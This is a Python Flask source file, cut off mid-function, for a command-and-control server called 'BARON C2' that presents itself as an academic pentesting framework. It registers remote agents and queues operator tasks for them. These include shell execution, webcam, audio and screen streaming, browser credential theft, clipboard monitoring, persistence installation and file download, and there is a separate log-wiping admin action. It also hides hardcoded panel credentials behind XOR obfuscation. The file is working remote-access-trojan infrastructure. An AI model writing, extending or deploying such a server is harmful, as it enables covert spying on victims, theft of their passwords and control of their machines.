#!/usr/bin/env python3
"""
BARON C2 v4.0 — Full Server
Academic Pentesting Framework
"""

import os
import sys
import json
import time
import hmac
import hashlib
import secrets
import logging
import threading
import base64
import re
import uuid
import subprocess
import tempfile
import shutil
from datetime import datetime, timedelta
from functools import wraps
from pathlib import Path

from flask import (
    Flask, request, jsonify, send_file,
    render_template, send_from_directory, Response
)
from flask_socketio import SocketIO, emit, join_room, leave_room

# ══════════════════════════════════════════════════════════════
# CONFIGURATION
# ══════════════════════════════════════════════════════════════

class Config:
    VERSION = "5.0-SOVEREIGN"
    PORT = int(os.environ.get('PORT', 5000))
    SECRET_KEY = os.environ.get('BARON_SECRET', secrets.token_hex(32))
    _CRED_KEY = b'\x4f\x7a\x2b\x91\xde\x33\xc7\x58\xa2\x1d\xe6\x0b\x74\xf9\x8c\x40'

    NONCE_WINDOW = 300
    TOKEN_LIFETIME = 86400
    LOGIN_LOCKOUT_TIME = 600
    LOGIN_MAX_ATTEMPTS = 5
    RATE_LIMIT_WINDOW = 60
    CLIENT_TIMEOUT = 300

    # Render.com compatible paths — use /tmp (ephemeral) or relative
    _base = os.path.dirname(os.path.abspath(__file__))
    STATE_FILE = os.environ.get('STATE_FILE', '/tmp/baron_state.enc')
    UPLOAD_DIR = os.environ.get('UPLOAD_DIR', os.path.join(_base, 'uploads'))
    BUILD_DIR  = os.environ.get('BUILD_DIR',  os.path.join(_base, 'builds'))

    @staticmethod
    def _xor_cred(data_hex):
        raw = bytes.fromhex(data_hex)
        key = Config._CRED_KEY
        return bytes(b ^ key[i % len(key)] for i, b in enumerate(raw)).decode('utf-8')

    @classmethod
    def get_credentials(cls):
        return {
            'users': {
                cls._xor_cred('9feafa110e8f17e872a0'): {
                    'password_hash': hashlib.sha256(
                        cls._xor_cred('9fcafa110e8f17e872a0c6dbce280c91ccaba94160e37e').encode()
                    ).hexdigest(),
                    'admin': False
                },
                cls._xor_cred('9fe0fb290fb317e072a636b0'): {
                    'password_hash': hashlib.sha256(
                        cls._xor_cred('1c0a4cfbad77ff339669b74e269ac402274b41f7a907f00ee375b37e').encode()
                    ).hexdigest(),
                    'admin': True
                }
            }
        }

# Create directories
os.makedirs(Config.UPLOAD_DIR, exist_ok=True)
os.makedirs(Config.BUILD_DIR, exist_ok=True)

# ══════════════════════════════════════════════════════════════
# LOGGING
# ══════════════════════════════════════════════════════════════

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)
logger = logging.getLogger('BARON')

# ══════════════════════════════════════════════════════════════
# CRYPTO ENGINE
# ══════════════════════════════════════════════════════════════

class CryptoEngine:
    """AES-256-GCM encryption with XOR fallback"""

    def __init__(self, key=None):
        self.key = key or hashlib.sha256(Config.SECRET_KEY.encode()).digest()
        self._has_aes = False
        try:
            from Crypto.Cipher import AES as _AES
            self._AES = _AES
            self._has_aes = True
        except ImportError:
            logger.warning("PyCryptodome not found — using XOR fallback")

    def encrypt(self, data):
        """Encrypt data, return base64 string"""
        if isinstance(data, str):
            data = data.encode('utf-8')
        try:
            if self._has_aes:
                from Crypto.Cipher import AES
                nonce = secrets.token_bytes(12)
                cipher = AES.new(self.key, AES.MODE_GCM, nonce=nonce)
                ct, tag = cipher.encrypt_and_digest(data)
                return base64.b64encode(nonce + tag + ct).decode()
            else:
                return self._xor_encrypt(data)
        except Exception as e:
            logger.error(f"Encrypt error: {e}")
            return base64.b64encode(data).decode()

    def decrypt(self, data_b64):
        """Decrypt base64 string, return bytes"""
        try:
            raw = base64.b64decode(data_b64)
            if self._has_aes:
                from Crypto.Cipher import AES
                nonce, tag, ct = raw[:12], raw[12:28], raw[28:]
                cipher = AES.new(self.key, AES.MODE_GCM, nonce=nonce)
                return cipher.decrypt_and_verify(ct, tag)
            else:
                return self._xor_decrypt(raw)
        except Exception as e:
            logger.error(f"Decrypt error: {e}")
            return raw

    def _xor_encrypt(self, data):
        stream_key = hashlib.pbkdf2_hmac('sha256', self.key, b'baron_xor', 100000)
        iv = secrets.token_bytes(16)
        encrypted = bytes(b ^ stream_key[(i + iv[i % 16]) % 32] for i, b in enumerate(data))
        return base64.b64encode(iv + encrypted).decode()

    def _xor_decrypt(self, raw):
        stream_key = hashlib.pbkdf2_hmac('sha256', self.key, b'baron_xor', 100000)
        iv, data = raw[:16], raw[16:]
        return bytes(b ^ stream_key[(i + iv[i % 16]) % 32] for i, b in enumerate(data))


crypto = CryptoEngine()

# ══════════════════════════════════════════════════════════════
# STATE MANAGER (Encrypted persistent storage)
# ══════════════════════════════════════════════════════════════

class StateManager:

    def __init__(self):
        self._lock = threading.RLock()
        self._save_timer = None
        self._state = self._load()

    def _defaults(self):
        return {
            'clients': {},
            'tasks': {},
            'results': {},
            'logs': [],
            'alerts': [],
            'nonces': [],
            'sessions': {},
            'bans': {},
            'login_attempts': {},
            'site_users': {},
            'uploads': [],
            'task_counter': 0,
            'start_time': time.time()
        }

    def _load(self):
        defaults = self._defaults()
        if not os.path.exists(Config.STATE_FILE):
            return defaults
        try:
            with open(Config.STATE_FILE, 'r') as f:
                raw = f.read()
            if raw.startswith('{'):
                data = json.loads(raw)
            else:
                decrypted = crypto.decrypt(raw)
                if isinstance(decrypted, bytes):
                    decrypted = decrypted.decode('utf-8')
                data = json.loads(decrypted)
            return {**defaults, **data}
        except Exception as e:
            logger.error(f"State load error: {e}")
            return defaults

    def save(self):
        with self._lock:
            try:
                raw = json.dumps(self._state, default=str)
                encrypted = crypto.encrypt(raw)
                with open(Config.STATE_FILE, 'w') as f:
                    f.write(encrypted)
            except Exception as e:
                logger.error(f"State save error: {e}")
                try:
                    with open(Config.STATE_FILE, 'w') as f:
                        json.dump(self._state, f, default=str)
                except Exception:
                    pass

    def get(self, key, default=None):
        with self._lock:
            return self._state.get(key, default)

    def set(self, key, value):
        with self._lock:
            self._state[key] = value
            self._schedule_save()

    def _schedule_save(self):
        if self._save_timer and self._save_timer.is_alive():
            return
        self._save_timer = threading.Timer(1.0, self.save)
        self._save_timer.daemon = True
        self._save_timer.start()

    def append_log(self, msg, level='info'):
        with self._lock:
            logs = self._state.get('logs', [])
            logs.append({
                'msg': msg,
                'level': level,
                'time': time.time()
            })
            if len(logs) > 500:
                logs = logs[-500:]
            self._state['logs'] = logs
            self._schedule_save()

    def append_alert(self, reason, data=None):
        with self._lock:
            alerts = self._state.get('alerts', [])
            alerts.append({
                'reason': reason,
                'data': data,
                'time': time.time(),
                'id': secrets.token_hex(4)
            })
            if len(alerts) > 200:
                alerts = alerts[-200:]
            self._state['alerts'] = alerts
            self._schedule_save()

    def increment(self, key):
        with self._lock:
            val = self._state.get(key, 0)
            self._state[key] = val + 1
            return val + 1

state = StateManager()

# ══════════════════════════════════════════════════════════════
# SECURITY GUARD
# ══════════════════════════════════════════════════════════════

class SecurityGuard:
    """Authentication, authorization, rate limiting, banning"""

    def __init__(self):
        self._rate_limits = {}
        self._rate_lock = threading.Lock()
        
        # Security Phase 1 Enhancements
        self.whitelisted_ips = ['81.25.50.119', '127.0.0.1', '192.168.1.100', '169.254.83.93']  # Master Override IPs
        self.honeypot_users = ['admin', 'root', 'administrator', 'system', 'test', 'guest']
        self._fim_thread = None
        self._file_hashes = {}

    def get_client_ip(self):
        """Get real client IP — with proxy awareness"""
        # On Render.com, the real IP is in X-Forwarded-For
        forwarded = request.headers.get('X-Forwarded-For', '')
        if forwarded:
            # Take the first IP (client's real IP)
            ip = forwarded.split(',')[0].strip()
            # Basic validation
            if re.match(r'^[\d.:a-fA-F]+$', ip):
                return ip
        return request.remote_addr or '0.0.0.0'

    def check_ban(self, ip):
        """Check if IP is banned. Returns ban info or None"""
        bans = state.get('bans') or {}
        ban = bans.get(ip)
        if not ban:
            return None
        # Check expiry
        until = ban.get('until', 0)
        if until > 0 and time.time() > until:
            # Ban expired
            del bans[ip]
            state.set('bans', bans)
            return None
        return ban

    def ban_ip(self, ip, duration_minutes=0, reason='', banned_by='system'):
        """Ban an IP. duration_minutes=0 means forever"""
        bans = state.get('bans') or {}
        until = 0
        until_str = 'Forever'
        if duration_minutes > 0:
            until = time.time() + (duration_minutes * 60)
            until_str = datetime.fromtimestamp(until).strftime('%Y-%m-%d %H:%M')

        bans[ip] = {
            'until': until,
            'until_str': until_str,
            'reason': reason,
            'banned_by': banned_by,
            'banned_at': time.time()
        }
        state.set('bans', bans)
        state.append_log(f"Banned IP {ip} — {reason} until {until_str}", 'warn')
        return True

    def unban_ip(self, ip):
        bans = state.get('bans') or {}
        if ip in bans:
            del bans[ip]
            state.set('bans', bans)
            state.append_log(f"Unbanned IP {ip}", 'info')
            return True
        return False

    def check_rate_limit(self, key, max_requests=30, window=60):
        """Rate limiter — returns True if allowed"""
        now = time.time()
        with self._rate_lock:
            if key not in self._rate_limits:
                self._rate_limits[key] = []
            hits = self._rate_limits[key]
            hits = [t for t in hits if now - t < window]
            if len(hits) >= max_requests:
                return False
            hits.append(now)
            self._rate_limits[key] = hits
            return True

    def check_login_attempts(self, ip):
        """Check if login attempts exceeded and apply tarpit delay"""
        attempts = state.get('login_attempts') or {}
        record = attempts.get(ip)
        if not record:
            return True
            
        count = record.get('count', 0)
        
        # Exponential tarpitting (Timing Attack / Bruteforce Mitigation)
        if count > 0:
            delay = min(2 ** (count - 1), 15)  # 1s, 2s, 4s, 8s, 15s max sleep
            if delay > 0:
                time.sleep(delay)
                
        if count >= Config.LOGIN_MAX_ATTEMPTS:
            if time.time() - record.get('last', 0) < Config.LOGIN_LOCKOUT_TIME:
                return False
            # Lockout expired but we leave the count so tarpit keeps working if they fail again
            record['count'] = Config.LOGIN_MAX_ATTEMPTS - 1
            attempts[ip] = record
            state.set('login_attempts', attempts)
        return True

    def record_login_attempt(self, ip, success=False):
        attempts = state.get('login_attempts') or {}
        if success:
            if ip in attempts:
                del attempts[ip]
            state.set('login_attempts', attempts)
            return
        record = attempts.get(ip, {'count': 0, 'last': 0})
        record['count'] = record.get('count', 0) + 1
        record['last'] = time.time()
        attempts[ip] = record
        state.set('login_attempts', attempts)
        
        # Auto-ban aggressive bruteforcers
        if record['count'] >= 15:
            self.ban_ip(ip, duration_minutes=1440, reason="Aggressive Bruteforce Detected (15+ fails)")

    def check_whitelist(self, ip):
        """Returns True if IP is allowed by whitelist"""
        if not self.whitelisted_ips: return True
        return ip in self.whitelisted_ips

    def handle_honeypot(self, user, ip):
        """Returns True if user is a honeypot, and bans IP"""
        if user.lower() in self.honeypot_users:
            self.ban_ip(ip, duration_minutes=1440, reason=f"Honeypot trap triggered for user {user}")
            state.append_log(f"CRITICAL: HONEYPOT TRIGGERED! IP {ip} tried to login as {user}.", 'error')
            return True
        return False
        
    def start_fim(self, paths):
        """File Integrity Monitoring for critical server files"""
        try:
            for p in paths:
                if os.path.exists(p):
                    with open(p, 'rb') as f:
                        self._file_hashes[p] = hashlib.sha256(f.read()).hexdigest()

            def fim_loop():
                while True:
                    time.sleep(30)
                    for p, expected_hash in self._file_hashes.items():
                        if os.path.exists(p):
                            with open(p, 'rb') as f:
                                actual = hashlib.sha256(f.read()).hexdigest()
                                if actual != expected_hash:
                                    logger.critical(f" ? ? ? FIM ALERT: File {p} was modified! Shutting down to prevent compromise.")
                                    os._exit(1) # Immediate uncontrolled exit
            
            self._fim_thread = threading.Thread(target=fim_loop, daemon=True)
            self._fim_thread.start()
            logger.info("Anti-Hacker: File Integrity Monitoring (FIM) Engine Started.")
        except Exception as e:
            logger.error(f"FIM Error: {e}")

    def create_session_token(self, user, ip, is_admin=False):
        """Create a session token bound to IP"""
        token = secrets.token_hex(32)
        sessions = state.get('sessions') or {}
        sessions[token] = {
            'user': user,
            'ip': ip,
            'admin': is_admin,
            'created': time.time(),
            'last_active': time.time()
        }
        state.set('sessions', sessions)
        return token

    def validate_session_token(self, token):
        """Validate and return session info or None"""
        if not token:
            return None
        sessions = state.get('sessions') or {}
        session = sessions.get(token)
        if not session:
            return None
        # Check expiry
        if time.time() - session.get('created', 0) > Config.TOKEN_LIFETIME:
            del sessions[token]
            state.set('sessions', sessions)
            return None
        # Update last active
        session['last_active'] = time.time()
        sessions[token] = session
        state.set('sessions', sessions)
        return session

    def invalidate_session(self, token):
        sessions = state.get('sessions') or {}
        if token in sessions:
            del sessions[token]
            state.set('sessions', sessions)

    def validate_nonce(self, nonce):
        """Anti-replay nonce validation"""
        if not nonce:
            return False
        nonces = state.get('nonces') or []
        now = time.time()
        # Check if nonce already used
        for n in nonces:
            if n.get('value') == nonce:
                return False
        # Add nonce
        nonces.append({'value': nonce, 'time': now})
        # Clean old nonces
        nonces = [n for n in nonces if now - n.get('time', 0) < Config.NONCE_WINDOW]
        state.set('nonces', nonces)
        return True

    def verify_client_hmac(self, data, signature, comm_key_hex=None):
        """Verify HMAC-SHA256 signature from agent"""
        if not signature or not comm_key_hex:
            return True  # No HMAC configured — pass through
        try:
            key = bytes.fromhex(comm_key_hex)
            expected = hmac.new(key, data.encode(), hashlib.sha256).hexdigest()  # type: ignore
            return hmac.compare_digest(expected, signature)
        except Exception:
            return False

    def track_site_user(self, ip, login=None, is_admin=False):
        """Track site visitors by IP"""
        users = state.get('site_users') or {}
        user = users.get(ip, {
            'ip': ip,
            'first_seen': time.time(),
            'login': login,
            'admin': is_admin,
            'client_count': 0,
            'logs': []
        })
        user['last_active'] = time.time()
        if login:
            user['login'] = login
        user['admin'] = is_admin

        # Add log
        log_entry = f"{datetime.now().strftime('%H:%M:%S')} — Active"
        user_logs = user.get('logs', [])
        user_logs.append(log_entry)
        if len(user_logs) > 50:
            user_logs = user_logs[-50:]
        user['logs'] = user_logs

        users[ip] = user
        state.set('site_users', users)

    def update_user_client_count(self, ip, count):
        users = state.get('site_users') or {}
        if ip in users:
            users[ip]['client_count'] = count
            state.set('site_users', users)


guard = SecurityGuard()

# ══════════════════════════════════════════════════════════════
# FLASK APP
# ══════════════════════════════════════════════════════════════

app = Flask(__name__, static_folder=None)
app.config['SECRET_KEY'] = Config.SECRET_KEY
app.config['MAX_CONTENT_LENGTH'] = 100 * 1024 * 1024  # 100MB
app.json.compact = True  # CRITICAL: removes spaces in JSON output so C# agent parser works

socketio = SocketIO(
    app,
    cors_allowed_origins="*",
    async_mode='threading',
    ping_timeout=60,
    ping_interval=25,
    max_http_buffer_size=50 * 1024 * 1024
)

# ══════════════════════════════════════════════════════════════
# MIDDLEWARE
# ══════════════════════════════════════════════════════════════

@app.before_request
def before_request_handler():
    """Security middleware — runs before every request"""
    ip = guard.get_client_ip()

    # Check ban
    ban = guard.check_ban(ip)
    if ban:
        if request.path.startswith('/api/'):
            return jsonify({
                'ok': False,
                'banned': True,
                'reason': ban.get('reason', ''),
                'until': ban.get('until_str', 'Forever')
            }), 403
        return Response("Access Denied", status=403)

    # Rate limit
    if not guard.check_rate_limit(f"global:{ip}", max_requests=120, window=60):
        if request.path.startswith('/api/'):
            return jsonify({'ok': False, 'error': 'Rate limited'}), 429
        return Response("Too Many Requests", status=429)


@app.after_request
def after_request_handler(response):
    """Security headers"""
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['Referrer-Policy'] = 'no-referrer'
    response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate'
    response.headers['Pragma'] = 'no-cache'
    if request.path.startswith('/api/'):
        response.headers['Content-Type'] = response.headers.get(
            'Content-Type', 'application/json'
        )
    return response


# ══════════════════════════════════════════════════════════════
# AUTH DECORATORS
# ══════════════════════════════════════════════════════════════

def require_auth(f):
    """Require valid panel session"""
    @wraps(f)
    def decorated(*args, **kwargs):
        token = request.headers.get('X-Token') or request.args.get('token', '')
        session = guard.validate_session_token(token)
        if not session:
            return jsonify({'ok': False, 'error': 'Unauthorized'}), 401
        request.session = session
        return f(*args, **kwargs)
    return decorated


def require_admin(f):
    """Require admin session"""
    @wraps(f)
    def decorated(*args, **kwargs):
        token = request.headers.get('X-Token') or request.args.get('token', '')
        session = guard.validate_session_token(token)
        if not session:
            return jsonify({'ok': False, 'error': 'Unauthorized'}), 401
        if not session.get('admin'):
            return jsonify({'ok': False, 'error': 'Admin required'}), 403
        request.session = session
        return f(*args, **kwargs)
    return decorated


# ══════════════════════════════════════════════════════════════
# PANEL ROUTES — Serve the UI
# ══════════════════════════════════════════════════════════════

@app.route('/')
def index():
    """Serve the main UI"""
    template_path = os.path.join(os.path.dirname(__file__), 'templates', 'index.html')
    if os.path.exists(template_path):
        with open(template_path, 'r', encoding='utf-8') as f:
            return Response(f.read(), content_type='text/html')
    return Response("<h1>BARON C2 — Place index.html in templates/</h1>", content_type='text/html')


@app.route('/health')
def health():
    return jsonify({'status': 'ok', 'version': Config.VERSION, 'uptime': time.time() - (state.get('start_time') or time.time())})


# ══════════════════════════════════════════════════════════════
# PANEL API — Login, Dashboard, etc
# ══════════════════════════════════════════════════════════════

@app.route('/api/panel/login', methods=['POST'])
def panel_login():
    """Login endpoint — credentials verified server-side, session bound to IP"""
    ip = guard.get_client_ip()

    # 1. Check Global IP Ban
    ban = guard.check_ban(ip)
    if ban:
        return jsonify({
            'ok': False, 
            'error': f'Banned: {ban.get("reason", "Security Policy Violation")} until {ban.get("until_str", "Forever")}'
        }), 403

    # 2. Check IP Whitelist (Anti-Hacker)
    if not guard.check_whitelist(ip):
        guard.ban_ip(ip, duration_minutes=60, reason="Not in secure whitelist")
        return jsonify({'ok': False, 'error': 'Access Denied'}), 403

    # 3. Check lockout and apply Tarpitting (Anti-Bruteforce / Timing Mitigation)
    if not guard.check_login_attempts(ip):
        remaining = Config.LOGIN_LOCKOUT_TIME - (time.time() - (state.get('login_attempts') or {}).get(ip, {}).get('last', 0))
        return jsonify({
            'ok': False,
            'error': f'Too many attempts. Wait {int(remaining)}s'
        }), 429

    # 4. Global Rate limit
    if not guard.check_rate_limit(f"login:{ip}", max_requests=5, window=30):
        return jsonify({'ok': False, 'error': 'Too many login attempts'}), 429

    data = request.get_json(silent=True) or {}
    login = data.get('login', '').strip()
    password = data.get('password', '')

    if not login or not password:
        return jsonify({'ok': False, 'error': 'Credentials required'}), 400

    # 5. Check Honeypot trigger
    if guard.handle_honeypot(login, ip):
        # We banned them, but return generic fake error to waste their time
        time.sleep(2)
        return jsonify({'ok': False, 'error': 'Invalid credentials'}), 401

    # Verify credentials
    password_hash = hashlib.sha256(password.encode()).hexdigest()
    creds = Config.get_credentials()

    user_data = creds['users'].get(login)
    if not user_data or not hmac.compare_digest(user_data['password_hash'], password_hash):
        guard.record_login_attempt(ip, success=False)
        # Constant-time delay to prevent timing attacks
        time.sleep(0.3 + secrets.randbelow(300) / 1000)
        state.append_log(f"Failed login from {ip} — user: {login}", 'warn')
        return jsonify({'ok': False, 'error': 'Invalid credentials'}), 401

    # Success
    guard.record_login_attempt(ip, success=True)
    is_admin = user_data.get('admin', False)
    token = guard.create_session_token(login, ip, is_admin)

    # Track user
    guard.track_site_user(ip, login, is_admin)

    state.append_log(f"Login: {login} from {ip} {'(admin)' if is_admin else ''}", 'info')

    return jsonify({
        'ok': True,
        'token': token,
        'user': login,
        'admin': is_admin
    })


@app.route('/api/panel/logout', methods=['POST'])
def panel_logout():
    token = request.headers.get('X-Token', '')
    guard.invalidate_session(token)
    return jsonify({'ok': True})


@app.route('/api/panel/check')
def panel_check():
    """Check if token is still valid"""
    token = request.headers.get('X-Token', '')
    session = guard.validate_session_token(token)
    if session:
        return jsonify({'ok': True, 'user': session['user'], 'admin': session.get('admin', False)})
    return jsonify({'ok': False}), 401


@app.route('/api/panel/clients')
@require_auth
def panel_clients():
    """Get all clients + stats — filtered by user IP for non-admins"""
    ip = guard.get_client_ip()
    session = request.session
    is_admin = session.get('admin', False)

    clients = state.get('clients') or {}
    logs = state.get('logs') or []
    tasks = state.get('tasks') or {}

    # Count tasks
    task_count = state.get('task_counter') or 0

    uptime = time.time() - (state.get('start_time') or time.time())

    result = {
        'ok': True,
        'clients': clients,
        'logs': logs[-50:],
        'tasks': task_count,
        'uptime': uptime
    }

    # Admin gets user list and ban list
    if is_admin:
        site_users = state.get('site_users') or {}
        result['users'] = list(site_users.values())
        result['bans'] = [
            {**v, 'ip': k}
            for k, v in (state.get('bans') or {}).items()
        ]

    return jsonify(result)


@app.route('/api/panel/alerts')
@require_auth
def panel_alerts():
    alerts = state.get('alerts') or []
    return jsonify({'ok': True, 'alerts': alerts[-100:]})


@app.route('/api/panel/results')
@require_auth
def panel_results():
    cid = request.args.get('cid', '')
    results = state.get('results') or {}
    client_results = results.get(cid, [])
    return jsonify({'ok': True, 'results': client_results[-50:]})


@app.route('/api/panel/command', methods=['POST'])
@require_auth
def panel_command():
    """Send command to a client"""
    data = request.get_json(silent=True) or {}
    cid = data.get('cid', '')
    cmd = data.get('cmd', {})

    if not cid or not cmd:
        return jsonify({'ok': False, 'error': 'cid and cmd required'}), 400

    clients = state.get('clients') or {}
    if cid not in clients:
        return jsonify({'ok': False, 'error': 'Client not found'}), 404

    # Map frontend action names to agent action names
    action_map = {
        'shell': 'exec',
        'screenshot': 'screen_start',
        'stream_screen': 'screen_start',
        'stop_stream': None,  # handled below
        'stream_webcam': 'webcam_start',
        'stream_audio': 'audio_start',
        'sysinfo': 'info',
        'network_scan': 'netscan',
        'browser_creds': 'browsers',
        'persist': 'persist_install',
        'file_list': 'filelist',
        'file_download': 'download',
        'clipboard_get': 'clipboard_start',
        'clipboard_monitor': 'clipboard_start',
        'set_wallpaper': 'wallpaper',
        'kill': 'kill',
        'uninstall': 'uninstall',
    }

    action = cmd.get('action', '')

    # Build task
    task = {}

    if action == 'shell':
        task = {'action': 'exec', 'cmd': cmd.get('command', '')}
    elif action == 'stop_stream':
        stream_type = cmd.get('type', 'screen')
        task = {'action': f'{stream_type}_stop'}
    elif action == 'set_wallpaper':
        file_id = cmd.get('file_id', '')
        if file_id:
            # Find upload by ID
            uploads = state.get('uploads') or []
            upload = next((u for u in uploads if u.get('id') == file_id), None)
            if upload:
                task = {'action': 'wallpaper', 'url': f"{request.host_url}api/panel/download_upload?id={file_id}"}
            else:
                task = {'action': 'wallpaper'}
        else:
            task = {'action': 'wallpaper', 'url': cmd.get('url', '')}
    elif action in action_map and action_map[action]:
        task = {'action': action_map[action]}
        # Pass through extra params
        for k, v in cmd.items():
            if k != 'action':
                task[k] = v
    else:
        task = cmd  # Pass through as-is

    # Generate task ID
    task_id = secrets.token_hex(6)
    task['task_id'] = task_id

    # Store task for client
    tasks = state.get('tasks') or {}
    if cid not in tasks:
        tasks[cid] = []
    tasks[cid].append(task)
    state.set('tasks', tasks)
    state.increment('task_counter')

    user = request.session.get('user', '?')
    state.append_log(f"Command: {action} → {cid[:8]} by {user}", 'info')

    # Notify via WebSocket
    socketio.emit('task_queued', {'cid': cid, 'task': task}, room='panel')

    return jsonify({'ok': True, 'task_id': task_id})


# ══════════════════════════════════════════════════════════════
# ADMIN ROUTES
# ══════════════════════════════════════════════════════════════

@app.route('/api/panel/ban', methods=['POST'])
@require_admin
def admin_ban():
    data = request.get_json(silent=True) or {}
    ip = data.get('ip', '').strip()
    duration = int(data.get('duration', 0))
    reason = data.get('reason', 'Banned by admin')

    if not ip:
        return jsonify({'ok': False, 'error': 'IP required'}), 400

    banned_by = request.session.get('user', 'admin')
    guard.ban_ip(ip, duration, reason, banned_by)
    return jsonify({'ok': True})


@app.route('/api/panel/unban', methods=['POST'])
@require_admin
def admin_unban():
    data = request.get_json(silent=True) or {}
    ip = data.get('ip', '').strip()
    if not ip:
        return jsonify({'ok': False, 'error': 'IP required'}), 400
    guard.unban_ip(ip)
    return jsonify({'ok': True})


@app.route('/api/panel/admin_action', methods=['POST'])
@require_admin
def admin_action():
    """Handle God Mode Admin Center actions"""
    data = request.get_json(silent=True) or {}
    action = data.get('action', '')
    
    if not action:
        return jsonify({'ok': False, 'error': 'Action required'}), 400

    user = request.session.get('user', 'admin')

    if action == 'clear_logs':
        # Wipe all logs
        state.set('logs', [])
        state.append_log(f"All logs were securely wiped by {user}", "warn")
        return jsonify({'ok': True})
        
    elif action == 'clean_db':
        # Remove dead/offline clients
        clients = state.get('clients') or {}
        now = time.time()
        alive = {cid: info for cid, info in clients.items() if (now - info.get('last_seen', 0)) < 60}
        state.set('clients', alive)
        state.append_log(f"Database cleaned by {user}. Dead ghosts removed.", "info")
        socketio.emit('clients_update', alive, namespace='/')
        return jsonify({'ok': True})
        
    elif action == 'panic':
        # Send kill command to everyone
        clients = state.get('clients') or {}
        tasks = state.get('tasks') or {}
        count = 0
        for cid in clients:
            if cid not in tasks:
                tasks[cid] = []
            tasks[cid].append({'action': 'kill', 'task_id': secrets.token_hex(6)})
            count += 1
        state.set('tasks', tasks)
        state.append_log(f"GLOBAL PANIC initiated by {user}. Sent kill to {count} agents.", "err")
        return jsonify({'ok': True})
        
    elif action == 'nuke_db':
        # Factory Reset
        state._data = {
            'clients': {},
            'tasks': {},
            'logs': [],
            'alerts': [],
            'ips': {},
            'task_counter': 0,
            'builder_stats': {'built': 0},
            'login_attempts': {}
        }
        state.save()
        state.append_log(f"DATABASE COMPLETELY NUKED BY {user}", "err")
        socketio.emit('clients_update', {}, namespace='/')
        return jsonify({'ok': True})

    return jsonify({'ok': False, 'error': 'Unknown action'}), 400


# ══════════════════════════════════════════════════════════════
# FILE UPLOAD (Real file upload)
# ══════════════════════════════════════════════════════════════

@app.route('/api/upload', methods=['POST'])
@require_auth
def upload_file():
    """Upload a real file to the server"""
    if 'file' not in request.files:
        return jsonify({'ok': False, 'error': 'No file'}), 400

    file = request.files['file']
    if not file.filename:
        return jsonify({'ok': False, 'error': 'No filename'}), 400

    # Sanitize filename
    safe_name = re.sub(r'[^\w\-.]', '_', file.filename)
    file_id = secrets.token_hex(8)
    save_path = os.path.join(Config.UPLOAD_DIR, f"{file_id}_{safe_name}")

    file.save(save_path)
    file_size = os.path.getsize(save_path)

    # Track upload
    uploads = state.get('uploads') or []
    upload_info = {
        'id': file_id,
        'name': safe_name,
        'path': save_path,
        'size': file_size,
        'time': time.time(),
        'uploaded_by': request.session.get('user', '?')
    }
    uploads.append(upload_info)
    state.set('uploads', uploads)

    state.append_log(f"Upload: {safe_name} ({file_size} bytes)", 'info')

    socketio.emit('upload_new', {
        'name': safe_name,
        'size': file_size,
        'id': file_id
    }, room='panel')

    return jsonify({'ok': True, 'id': file_id, 'name': safe_name, 'size': file_size})


@app.route('/api/panel/uploads')
@require_auth
def list_uploads():
    uploads = state.get('uploads') or []
    return jsonify({'ok': True, 'uploads': uploads[-50:]})


@app.route('/api/panel/download_upload')
def download_upload():
    """Download an uploaded file by ID"""
    file_id = request.args.get('id', '')
    uploads = state.get('uploads') or []
    upload = next((u for u in uploads if u.get('id') == file_id), None)
    if not upload or not os.path.exists(upload.get('path', '')):
        return jsonify({'ok': False, 'error': 'Not found'}), 404
    return send_file(
        upload['path'],
        as_attachment=True,
        download_name=upload.get('name', 'file')
    )


# ══════════════════════════════════════════════════════════════
# AGENT API — Registration, Beacon, Results, Streams
# ══════════════════════════════════════════════════════════════

@app.route('/api/agent/register', methods=['POST'])
def agent_register():
    """Agent registration endpoint"""
    ip = guard.get_client_ip()

    if not guard.check_rate_limit(f"reg:{ip}", max_requests=10, window=60):
        return jsonify({'error': 'Rate limited'}), 429

    data = request.get_json(silent=True) or {}
    cid = data.get('id', '')
    if not cid:
        return jsonify({'error': 'No ID'}), 400

    clients = state.get('clients') or {}
    clients[cid] = {
        'id': cid,
        'hostname': data.get('hostname', '?'),
        'username': data.get('username', '?'),
        'os': data.get('os', '?'),
        'ip': ip,
        'is_admin': data.get('is_admin', False),
        'version': data.get('version', '?'),
        'fingerprint': data.get('fingerprint', ''),
        'first_seen': time.time(),
        'last_seen': time.time(),
        'online': True
    }
    state.set('clients', clients)

    state.append_log(f"New agent: {data.get('hostname','?')} ({cid[:8]}) from {ip}", 'info')
    state.append_alert(f"New client: {data.get('hostname','?')} ({data.get('os','?')})")

    # Update site user client count
    users = state.get('site_users') or {}
    client_count = sum(1 for c in clients.values() if c.get('ip') == ip)
    if ip in users:
        users[ip]['client_count'] = client_count
        state.set('site_users', users)

    socketio.emit('client_new', {
        'id': cid,
        'hostname': data.get('hostname', '?'),
        'ip': ip
    }, room='panel')

    return jsonify({'ok': True})


@app.route('/api/agent/beacon', methods=['POST'])
def agent_beacon():
    """Agent beacon — heartbeat + task delivery"""
    ip = guard.get_client_ip()

    if not guard.check_rate_limit(f"beacon:{ip}", max_requests=6000, window=60):
        return jsonify({'t': []}), 429

    data = request.get_json(silent=True) or {}
    cid = data.get('id', '')

    if not cid:
        return jsonify({'t': []}), 400

    # Update last_seen
    clients = state.get('clients') or {}
    if cid in clients:
        clients[cid]['last_seen'] = time.time()
        clients[cid]['online'] = True
        clients[cid]['ip'] = ip
        state.set('clients', clients)
    else:
        return jsonify({'t': []}), 404

    # Get pending tasks
    tasks = state.get('tasks') or {}
    pending = tasks.get(cid, [])

    # Clear delivered tasks
    if pending:
        tasks[cid] = []
        state.set('tasks', tasks)
        logger.info(f"Delivered {len(pending)} task(s) to {cid[:8]}")

    return jsonify({'t': pending})


@app.route('/api/agent/result', methods=['POST'])
def agent_result():
    """Agent sends command results back"""
    ip = guard.get_client_ip()

    if not guard.check_rate_limit(f"result:{ip}", max_requests=60, window=60):
        return jsonify({'ok': False}), 429

    data = request.get_json(silent=True) or {}
    cid = data.get('id', request.headers.get('X-Client-ID', ''))
    result_type = data.get('type', 'unknown')
    result_data = data.get('data', '')

    if not cid:
        return jsonify({'ok': False}), 400

    # Store result
    results = state.get('results') or {}
    if cid not in results:
        results[cid] = []
    results[cid].append({
        'type': result_type,
        'data': result_data[:50000],  # Limit size
        'time': time.time()
    })
    # Keep last 100 results per client
